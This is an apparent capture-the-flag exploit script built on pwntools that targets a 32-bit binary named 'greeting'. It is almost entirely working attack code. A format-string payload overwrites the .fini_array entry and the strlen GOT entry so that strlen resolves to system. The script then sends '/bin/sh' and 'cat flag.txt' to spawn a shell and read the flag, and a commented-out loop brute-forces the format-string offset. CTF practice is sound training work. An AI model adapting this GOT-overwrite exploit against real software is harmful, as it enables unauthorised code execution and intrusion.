#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './greeting'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *0x08048654
b *0x0804864c
c
c
c
x/x 0x08049934
x/x 0x08049a54
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
"""
for i in range(32):
    try:
        p = start()
        p.recvline()
        p.sendline(f"AAAB%{i}$x")
        ret = p.recvline()
        if b"4141" in ret:
            print(i)
            print("done")
            print(ret)
    except:
        continue
"""

p = start()
p.recvline()
p.recvuntil("...")

strlenGot = 0x08049a54
strlen_addr0 = p32(strlenGot)
strlen_addr1 = p32(strlenGot + 2)

finiArray = 0x08049934
fini_addr0 = p32(finiArray)
fini_addr1 = p32(finiArray + 2)

systemPlt = 0x8048490
getnline = 0x8048614

payload = b""

# rando pad :)
payload += b"xx"

payload += fini_addr0

payload += fini_addr1

payload += strlen_addr0

payload += strlen_addr1

# lower 2 bytes fini -> getnline
payload += b"%34288x"
payload += b"%12$n"

# lower 2 bytes strlen -> system
payload += b"%65148x"
payload += b"%14$n"

# higher two bytes are common, so only one pad necessary
payload += b"%33652x"
payload += b"%13$n"
payload += b"%15$n"

print("len:" + str(len(payload)))

p.sendline(payload)
p.sendline(b"/bin/sh")
p.sendline(b"cat flag.txt")
p.recvline()
print(p.recvline())

if args.GDB:
    gdb.quit()

